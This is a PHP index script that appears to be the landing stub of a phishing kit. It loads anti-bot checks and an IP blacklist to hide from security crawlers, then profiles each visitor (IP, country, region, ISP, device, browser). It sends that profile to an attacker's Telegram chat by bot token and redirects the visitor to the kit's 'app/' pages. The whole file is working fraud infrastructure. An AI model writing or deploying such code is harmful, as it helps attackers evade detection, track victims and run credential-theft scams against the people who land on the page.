<?php 

session_start();
include 'config.php';
include 'antibots/index.php';
include 'app/functions.php';
$blacklist = file('antibots/blacklistips.txt', FILE_IGNORE_NEW_LINES);
$ip = $_SERVER['REMOTE_ADDR'];
include 'check_ip.php';
$os_plat = getOS($user_agent);
$browser = getBrowser();
$_SESSION['BotToken'] = $BotToken;
$_SESSION['ChatId'] = $ChatId;
$ip = $_SERVER['REMOTE_ADDR'];
$TIME = date("d/m/Y");
get_user_ipinfo($ip);
$Message_vis = "
📦 ━━━━━━━━━━━━ 📦
✅ Sup new visit:
Ip:  `$ip`
Country:  $countryy - $country_code
Region:  $regionn
Telecom:  $isp
Date:  $TIME 
Device: $os_plat - $browser
📦 ━━━━━━━━━━━━ 📦
";
sendMessage($ChatId, $Message_vis, $BotToken);
header("location: app/");
?>